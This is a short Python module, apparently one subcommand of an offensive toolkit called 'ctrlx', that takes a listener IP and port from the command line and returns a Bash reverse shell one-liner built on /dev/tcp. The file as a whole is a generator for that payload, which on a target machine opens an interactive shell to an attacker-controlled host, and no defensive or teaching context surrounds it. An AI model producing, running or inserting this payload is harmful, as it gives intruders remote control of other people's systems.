import argparse

def run(raw_args):
    parser = argparse.ArgumentParser(
        prog="ctrlx axt --type bsh",
        description="Generate Bash reverse shell one-liner payload",
        epilog="Contoh: python ctrlx.py axt --type bsh --lhost 192.168.1.5 --lport 4444 --save"
    )

    parser.add_argument("--lhost", required=True, help="IP address for reverse connection")
    parser.add_argument("--lport", required=True, help="Port for reverse connection")

    args = parser.parse_args(raw_args)

    bash_payload = (
        f"bash -i >& /dev/tcp/{args.lhost}/{args.lport} 0>&1"
    )

    result = f"[Bash Reverse Shell Payload]\n{bash_payload}"
    return result
